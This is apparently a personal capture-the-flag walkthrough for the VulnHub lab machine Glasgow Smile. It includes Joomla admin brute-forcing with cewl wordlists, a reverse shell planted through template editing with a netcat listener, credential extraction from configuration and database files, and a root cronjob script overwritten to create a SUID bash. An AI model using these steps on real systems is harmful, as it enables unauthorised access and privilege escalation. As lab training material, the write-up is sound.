# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/GoldenEye-1]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
index.html              [Status: 200, Size: 125, Words: 7, Lines: 9]
index.html              [Status: 200, Size: 125, Words: 7, Lines: 9]
joomla                  [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 318 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
- `joomla`
# Initial Foothold
## TCP/80 - HTTP - Cewl + Joomla Bruteforce + Shell Upload
1. View to enumerated directories
	- `index.html`
		![](images/Pasted%20image%2020220125235608.png)
	- `joomla`
		![](images/Pasted%20image%2020220125235712.png)
2. Enumerate joomla
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1]
	└─# joomscan --url http://$ip/joomla -ec
		____  _____  _____  __  __  ___   ___    __    _  _ 
	   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
	  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
	  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
				(1337.today)

		--=[OWASP JoomScan
		+---++---==[Version : 0.0.7
		+---++---==[Update Date : [2018/09/23]
		+---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
		--=[Code name : Self Challenge
		@OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

	Processing http://192.168.1.1/joomla ...



	[+] FireWall Detector
	[++] Firewall not detected

	[+] Detecting Joomla Version
	[++] Joomla 3.7.3rc1

	[+] Core Joomla Vulnerability
	[++] Target Joomla core is not vulnerable

	[+] Checking Directory Listing
	[++] directory has directory listing : 
	http://192.168.1.1/joomla/administrator/components
	http://192.168.1.1/joomla/administrator/modules
	http://192.168.1.1/joomla/administrator/templates
	http://192.168.1.1/joomla/images/banners


	[+] Checking apache info/status files
	[++] Readable info/status files are not found

	[+] admin finder
	[++] Admin page : http://192.168.1.1/joomla/administrator/

	[+] Checking robots.txt existing
	[++] robots.txt is found
	path : http://192.168.1.1/joomla/robots.txt 

	Interesting path found from robots.txt
	http://192.168.1.1/joomla/joomla/administrator/
	http://192.168.1.1/joomla/administrator/
	http://192.168.1.1/joomla/bin/
	http://192.168.1.1/joomla/cache/
	http://192.168.1.1/joomla/cli/
	http://192.168.1.1/joomla/components/
	http://192.168.1.1/joomla/includes/
	http://192.168.1.1/joomla/installation/
	http://192.168.1.1/joomla/language/
	http://192.168.1.1/joomla/layouts/
	http://192.168.1.1/joomla/libraries/
	http://192.168.1.1/joomla/logs/
	http://192.168.1.1/joomla/modules/
	http://192.168.1.1/joomla/plugins/
	http://192.168.1.1/joomla/tmp/
	```
	- `http://192.168.1.1/joomla/administrator/index.php`
	- `robots.txt`
3. Viewed all directories in `robots.txt`, could not find anything
4. Try a bruteforce attack as a last resort
5. Generate a custom wordlist w/ cewl
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla]
	└─# cewl http://192.168.1.1/joomla/index.php -w passwords.txt
	CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla]
	└─# cat >> usernames.txt << EOF
	> Joker
	> joker
	> Arthur
	> arthur
	> Rob
	> rob
	> admin
	> joomla
	> EOF

	```
6. Bruteforce Joomla CMS 
	- Hydra/Burp did not work due to a unqiue token being generated 
		- https://www.securityartwork.es/2013/02/14/nmap-script-http-joomla-brute-where-thc-hydra-doesnt-fit/
	-  NMAP Script: `http-joomla-brute`, 
		- https://nmap.org/nsedoc/scripts/http-joomla-brute.html
		- `http-joomla-brute.uri`: 
			- specify path to `/administrator/index.php`
	- CMSeek
		- https://github.com/Tuhinshubhra/CMSeeK
7. Bruteforce w/ nmap script
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla]
	└─# nmap -p80 --script http-joomla-brute 192.168.1.1 --script-args 'userdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/usernames.txt,passdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/passwords.txt,brute.firstonly=true,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=5'
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 02:10 +08
	Nmap scan report for 192.168.1.1
	Host is up (0.00027s latency).

	PORT   STATE SERVICE
	80/tcp open  http
	| http-joomla-brute: 
	|   Accounts: 
	|     joomla:Gotham - Valid credentials
	|_  Statistics: Performed 1342 guesses in 91 seconds, average tps: 14.4
	MAC Address: 00:0C:29:4F:F2:DE (VMware)

	Nmap done: 1 IP address (1 host up) scanned in 91.21 seconds
	```
8. Bruteforce w/ CMSeek
	```
	 ___ _  _ ____ ____ ____ _  _
	|    |\/| [__  |___ |___ |_/  by @r3dhax0r
	|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


	 [+]  Joomla Bruteforce Module  [+] 

	Enter target site (https://example.tld): http://192.168.1.1/joomla         
	[i] Checking for Joomla
	[*] Joomla Confirmed... Confirming form and getting token...
	[~] Enter Usernames with coma as separation without any space (example: cris,harry): joomla

	[i] Bruteforcing User: joomla
	[*] Testing Password: Gothamlkyesed

	[*] Password found!
	 |
	 |--[username]--> joomla
	 |
	 |--[password]--> Gotham
	 |
	[*] Enjoy The Hunt!

	[*] Credentials stored at: /usr/share/cmseek/Result/192.168.1.1_joomla/bruteforce_result_joomla_.txt
	```
	- joomla:Gotham
9. Proceed to `http://192.168.1.1/joomla/administrator/index.php?option=com_templates`
10. Upload reverse shell by editing `/error.php` in template "protostar"
	![](images/Pasted%20image%2020220126043723.png)
11. Execute reverse shell at `http://192.168.1.1/joomla/templates/beez3/error.php`
12. Obtain www-data shell
	```
	┌──(root💀kali)-[~/tools]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	Ncat: Connection from 192.168.1.1.
	Ncat: Connection from 192.168.1.1:55604.
	Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
	 14:48:46 up  1:42,  0 users,  load average: 0.08, 0.09, 0.09
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	/bin/sh: 0: can't access tty; job control turned off
	whoami
	www-data
	$ 
	```
	![](images/Pasted%20image%2020220126045057.png)


# Privilege Escalation
## Rob - Via SQL Creds Found 
1. Find SQL Credentials
	```
	www-data@glasgowsmile:/var/www$ cd /joomla2	
	www-data@glasgowsmile:/var/www/joomla2$ ls
	www-data@glasgowsmile:/var/www/joomla2$ cat configuration.php 
	```
	![](images/Pasted%20image%2020220127054519.png)
	- joomla:babyjoker

2. Access MySQL, 
	1. Obtain more creds from `joomla_db`
		```
		www-data@glasgowsmile:/var/www/joomla2$ mysql -u joomla -p
		Enter password: babyjoker
		Welcome to the MariaDB monitor.  Commands end with ; or \g.
		Your MariaDB connection id is 15726
		Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

		Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

		Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

		MariaDB [(none)]> show databases;
		+--------------------+
		| Database           |
		+--------------------+
		| batjoke            |
		| information_schema |
		| joomla_db          |
		| mysql              |
		| performance_schema |
		+--------------------+
		5 rows in set (0.000 sec)

		MariaDB [(none)]> use joomla_db
		Database changed

		MariaDB [joomla_db]> SELECT username,password from jnqcu_users;
		+----------+--------------------------------------------------------------+
		| username | password                                                     |
		+----------+--------------------------------------------------------------+
		| joomla   | $2y$10$9.svWPvNCg0qoD1mf8NJFe1SHltICeEvVS7alBkG3M3aFoPFge9yu |
		+----------+--------------------------------------------------------------+
		1 row in set (0.001 sec)
		```
		- No new creds
	2. Obtain credentials from `batjoke`
		```
		MariaDB [joomla_db]> use batjoke
		Reading table information for completion of table and column names
		You can turn off this feature to get a quicker startup with -A

		Database changed
		MariaDB [batjoke]> show tables;
		+-------------------+
		| Tables_in_batjoke |
		+-------------------+
		| equipment         |
		| taskforce         |
		+-------------------+
		2 rows in set (0.000 sec)

		MariaDB [batjoke]> select * from equipment;
		Empty set (0.000 sec)

		MariaDB [batjoke]> select * from taskforce;
		+----+---------+------------+---------+----------------------------------------------+
		| id | type    | date       | name    | pswd                                         |
		+----+---------+------------+---------+----------------------------------------------+
		|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
		|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
		|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
		|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
		|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
		|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
		+----+---------+------------+---------+----------------------------------------------+
		6 rows in set (0.000 sec)
		```
		- password is base64 encoded
3. Decode password
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
	└─# cat creds | cut -d '|' -f5 | sed 's/+\|-\|name//g' | awk 'NF' | tee usernames.txt
	 Bane    
	 Aaron   
	 Carnage 
	 buster  
	 rob     
	 aunt    
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
	└─# cat creds | cut -d '|' -f6 | sed 's/+\|-\|pswd//g' | awk 'NF' | tee base64encoded.txt
	 YmFuZWlzaGVyZQ==                             
	 YWFyb25pc2hlcmU=                             
	 Y2FybmFnZWlzaGVyZQ==                         
	 YnVzdGVyaXNoZXJlZmY=                         
	 Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ 
	 YXVudGlzIHRoZSBmdWNrIGhlcmU=   
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
	└─# for x in $(<base64encoded.txt); do echo -n $x | base64 -d; echo ""; done | tee base64decoded.txt
	baneishere
	aaronishere
	carnageishere
	busterishereff
	???AllIHaveAreNegativeThoughts???
	auntis the fuck here
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
	└─# paste -d ":" usernames.txt base64decode.txt 
	 Bane    :baneishere
	 Aaron   :aaronishere
	 Carnage :carnageishere
	 buster  :busterishereff
	 rob     :???AllIHaveAreNegativeThoughts???
	 aunt    :auntis the fuck here
	```
4. Extract usernames from `/etc/passwd`
	```
	www-data@glasgowsmile:/home$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
	rob
	abner
	penguin
	```
5. Switch to user to rob
	![](images/Pasted%20image%2020220127154212.png)
6. User Flag
	```
	rob@glasgowsmile:~$ cat user.txt 
	JKR[f5bb11acbb957915e421d62e7253d27a]
	rob@glasgowsmile:~$ 
	```
	
## Abner - Via Ciphertext
1. View files in rob's home directory
	```
	rob@glasgowsmile:~$ ls -la
	total 52
	drwxr-xr-x 3 rob  rob  4096 Jun 16  2020 .
	drwxr-xr-x 5 root root 4096 Jun 15  2020 ..
	-rw-r----- 1 rob  rob   454 Jun 14  2020 Abnerineedyourhelp
	-rw------- 1 rob  rob   113 Jan 26 16:18 .bash_history
	-rw-r--r-- 1 rob  rob   220 Jun 13  2020 .bash_logout
	-rw-r--r-- 1 rob  rob  3526 Jun 13  2020 .bashrc
	-rw-r----- 1 rob  rob   313 Jun 14  2020 howtoberoot
	drwxr-xr-x 3 rob  rob  4096 Jun 13  2020 .local
	-rw------- 1 rob  rob    81 Jun 15  2020 .mysql_history
	-rw-r--r-- 1 rob  rob   807 Jun 13  2020 .profile
	-rw-r--r-- 1 rob  rob    66 Jun 15  2020 .selected_editor
	-rw-r----- 1 rob  rob    38 Jun 13  2020 user.txt
	-rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority
	rob@glasgowsmile:~$ 
	```
	- `bash_history`
	- `Abnerineedyourhelp`
	- `howtoberoot`
	- `.local`
2. View the files 
	- `.bash_history`
		- Nothing Found
	- `Abnerineedyourhelp`
		```
		rob@glasgowsmile:~$ cat Abnerineedyourhelp 
		Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
		Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
		```
	- `.local`
		- Nothing Found
	- `howtoberoot`
		```
		rob@glasgowsmile:~$ cat howtoberoot 
		  _____ ______   __  _   _    _    ____  ____  _____ ____  
		 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
		   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
		   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
		   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

		NO HINTS.
		```
3. Decipher ciphertext
	![](images/Pasted%20image%2020220127155649.png)
	```
	Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't." 
	
	Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
	```
4. Decode base64 encoded text
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
	└─# echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
	I33hope99my0death000makes44more8cents00than0my0life0
	
	```
5. Switch to user abner
	![](images/Pasted%20image%2020220127155906.png)
6. User Flag 2
	```
	abner@glasgowsmile:~$ cat user2.txt 
	JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
	```

## Penguin - Via Creds Found + Cracking Zip file
1. View files in abner home directory
	```
	abner@glasgowsmile:~$ ls -la
	total 44
	drwxr-xr-x 4 abner abner 4096 Jun 16  2020 .
	drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
	-rw------- 1 abner abner  167 Jan 25 13:06 .bash_history
	-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
	-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
	-rw-r----- 1 abner abner  565 Jun 16  2020 info.txt
	drwxr-xr-x 3 abner abner 4096 Jun 14  2020 .local
	-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
	drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
	-rw-r----- 1 abner abner   38 Jun 16  2020 user2.txt
	-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
	abner@glasgowsmile:~$ 
	```
	- `.bash_history`
	- `info.txt`
2. View the files
	- `info.txt`
		```
		abner@glasgowsmile:~$ cat info.txt 
		A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
		The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
		The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
		```
	- `.bash_history`
		```
		abner@glasgowsmile:~$ cat .bash_history 
		whoami
		systemctl reboot
		fuck
		su penguin
		mysql -u root -p
		exit
		cd .bash/
		ls
		unzip .dear_penguins.zip
		cat dear_penguins
		rm dear_penguins
		exit
		```
		- `.dear_penguins.zip`
3. Find `.dear_penguins.zip`
	```
	abner@glasgowsmile:/home/penguin$ find / 2>/dev/null | grep penguin
	/home/penguin
	/home/penguin/.bash_history
	/home/penguin/.bashrc
	/home/penguin/.Xauthority
	/home/penguin/.bash_logout
	/home/penguin/.profile
	/home/penguin/SomeoneWhoHidesBehindAMask
	/home/penguin/SomeoneWhoHidesBehindAMask/user3.txt
	/home/penguin/SomeoneWhoHidesBehindAMask/find
	/home/penguin/SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt
	/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
	/home/penguin/.ssh
	/home/penguin/.local
	/home/penguin/.local/share
	/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
	```
	- `/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip`
4. View permissions of `/home/penguin/SomeoneWhoHidesBehindAMask`
	```
	abner@glasgowsmile:/home/penguin$ ls -l SomeoneWhoHidesBehindAMask/
	ls: cannot access 'SomeoneWhoHidesBehindAMask/user3.txt': Permission denied
	ls: cannot access 'SomeoneWhoHidesBehindAMask/find': Permission denied
	ls: cannot access 'SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt': Permission denied
	total 0
	-????????? ? ? ? ?            ? find
	-????????? ? ? ? ?            ? PeopleAreStartingToNotice.txt
	-????????? ? ? ? ?            ? user3.txt
	```
5. Unzip `dear_penguins.zip`
	- There is a password
6. Create wordlist w/ `info.txt`  
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# cewl localhost/info.txt -w cewl_info.txt
	```
7. Compile all passwords we have
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# cp ../sql/base64decode.txt  .
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# cat base64decode.txt cewl_info.txt passwords.txt >> compiled_passwords.txt
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# echo -n I33hope99my0death000makes44more8cents00than0my0life0 >> compiled_passwords.txt

	```
8. Crack it w/ john
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# john john_zip --wordlist=compiled_passwords.txt
	Press 'q' or Ctrl-C to abort, almost any other key for status
	I33hope99my0death000makes44more8cents00than0my0life0 (dear_penguins.zip/dear_penguins)     
	1g 0:00:00:00 DONE (2022-01-27 16:45) 100.0g/s 22700p/s 22700c/s 22700C/s baneishere..Joomla
	```
	- Same password as abner
9. View extracted file
	```
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# unzip dear_penguins.zip
	Archive:  dear_penguins.zip
	[dear_penguins.zip] dear_penguins password: 
	  inflating: dear_penguins           
	  
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# cat dear_penguins
	My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
	scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
	
	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
	└─# echo -n scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz >> compiled_passwords.txt 
	```
	- penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
10. Switch to user penguin
	![](images/Pasted%20image%2020220127164946.png)
11. User Flag 3
	```
	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt 
	JKR{284a3753ec11a592ee34098b8cb43d52}
	```

## Root - Via Cronjob
1. View files in `/home/penguin/SomeoneWhoHidesBehindAMask`
	```
	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
	total 332
	drwxr--r-- 2 penguin penguin   4096 Jan 27 02:59 .
	drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
	-rwsr-x--x 1 penguin penguin 315904 Jun 15  2020 find
	-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
	-rwxr-xr-x 1 penguin root       664 Jan 27 02:59 .trash_old
	-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
	```
	- find SUID Binary is useless because owner is penguin
	- .trash_old
	- PeopleAreStartingToNotice.txt
2. View files
	![](images/Pasted%20image%2020220127170316.png)
	- Could not find any way to privilege escalate
3. Assume `.trash_old` is executed by cronjob, replace it to spawn a root shell
	```
	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old; chmod 4777  /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old

	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -l /tmp
	total 1152
	-rwsr-xr-x 1 root root 1168776 Jan 27 03:07 rootbash
	```
4. Obtain root shell
	![](images/Pasted%20image%2020220127170756.png)
5. Root Flag
	```
	rootbash-5.0# cd /root
	rootbash-5.0# ls
	root.txt  whoami
	rootbash-5.0# cat root.txt 
	  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
	 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
	▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
	░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
	░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
	 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
	  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
	░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
		  ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



	Congratulations!

	You've got the Glasgow Smile!

	JKR{68028b11a1b7d56c521a90fc18252995}

	Credits by

	mindsflee

	```
6. Snoop processes w/o root privileges
	```
	penguin@glasgowsmile:/tmp$ ./pspy64 
	pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

	2022/01/27 03:13:01 CMD: UID=0    PID=13411  | /usr/sbin/CRON -f 
	2022/01/27 03:13:01 CMD: UID=0    PID=13412  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:13:01 CMD: UID=0    PID=13413  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:13:01 CMD: UID=0    PID=13414  | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:13:12 CMD: UID=0    PID=13415  | 
	2022/01/27 03:14:01 CMD: UID=0    PID=13416  | /usr/sbin/CRON -f 
	2022/01/27 03:14:02 CMD: UID=0    PID=13417  | /usr/sbin/CRON -f 
	2022/01/27 03:14:02 CMD: UID=0    PID=13418  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:14:02 CMD: UID=0    PID=13419  | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:15:01 CMD: UID=0    PID=13420  | /usr/sbin/CRON -f 
	2022/01/27 03:15:01 CMD: UID=0    PID=13421  | /usr/sbin/CRON -f 
	2022/01/27 03:15:01 CMD: UID=0    PID=13422  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	2022/01/27 03:15:01 CMD: UID=0    PID=13423  | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
	```
	- We can see that cronjob is executing `.trash_old` every minute
	
	
---
Tags: #tcp/80-http/cms/joomla #tcp/80-http/rce #linux-priv-esc/linux-creds-found #linux-priv-esc/cronjob #cryptography 

---